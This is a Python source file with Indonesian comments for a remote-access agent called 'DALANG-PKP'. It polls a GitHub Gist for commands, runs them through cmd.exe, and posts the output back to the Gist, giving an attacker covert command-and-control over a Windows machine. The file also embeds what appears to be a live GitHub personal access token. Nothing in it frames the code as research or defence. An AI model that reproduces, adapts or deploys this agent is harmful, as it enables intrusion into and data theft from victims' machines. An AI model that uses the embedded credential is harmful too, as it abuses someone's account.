# agent_dalang.py (Revisi PKP - Protokol Pihak Ketiga)

import requests
import subprocess
import time
import random
import json
import os

# --- KONFIGURASI AGENT ---
# Rahasia ini akan disematkan langsung di agent
# Dalam skenario nyata, ini akan di-obfuscate dengan sangat kuat
GITHUB_PAT = "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"
GIST_ID = "reddoors"
GITHUB_API_URL = f"https://api.github.com/gists/{GIST_ID}/comments"
AUTH_HEADERS = {
    "Authorization": f"token {GITHUB_PAT}",
    "Accept": "application/vnd.github.v3+json"
}
# ID untuk menandai task yang sudah dikerjakan
PROCESSED_TASK_IDS = set()

def get_task_from_gist():
    """Membaca semua komentar di Gist dan mencari tugas baru."""
    try:
        response = requests.get(GITHUB_API_URL, headers=AUTH_HEADERS, timeout=10)
        response.raise_for_status()
        comments = response.json()
        
        # Cari tugas terbaru yang belum diproses
        for comment in reversed(comments): # Mulai dari yang terbaru
            comment_id = comment['id']
            if comment_id in PROCESSED_TASK_IDS:
                continue # Lewati jika sudah dikerjakan

            try:
                body = json.loads(comment['body'])
                if body.get('type') == 'TASK' and body.get('status') == 'pending':
                    print(f"[*] Tugas baru ditemukan dari Gist (ID: {comment_id})")
                    PROCESSED_TASK_IDS.add(comment_id)
                    return body.get('command')
            except (json.JSONDecodeError, KeyError):
                continue
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengambil tugas dari Gist: {e}")
        return None

def execute_command(command):
    """Mengeksekusi perintah menggunakan LOTL."""
    try:
        # Untuk simple, kita gunakan cmd.exe saja
        full_command = ["cmd.exe", "/c", command]
        result = subprocess.run(full_command, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else ""
        output += result.stderr if result.stderr else ""
        return output if output else "Perintah dieksekusi tanpa output."
    except Exception as e:
        return f"Error saat eksekusi: {str(e)}"

def send_results_to_gist(command, output):
    """Mempublikasikan hasil sebagai komentar baru di Gist."""
    payload = {
        "body": json.dumps({
            "type": "RESULT",
            "task": command,
            "output": output
        })
    }
    try:
        response = requests.post(GITHUB_API_URL, headers=AUTH_HEADERS, json=payload, timeout=10)
        response.raise_for_status()
        print(f"[+] Hasil berhasil dikirim ke Gist.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengirim hasil ke Gist: {e}")

def main_loop():
    print("[*] Agent DALANG-PKP Aktif. Memantau Gist untuk perintah...")
    while True:
        command = get_task_from_gist()
        if command:
            print(f"[*] Mengeksekusi: {command}")
            output = execute_command(command)
            send_results_to_gist(command, output)
        
        # Tidur dengan interval acak yang lebih lama karena komunikasi tidak langsung
        sleep_time = random.randint(45, 75)
        print(f"[*] Tidur selama {sleep_time} detik...")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main_loop()
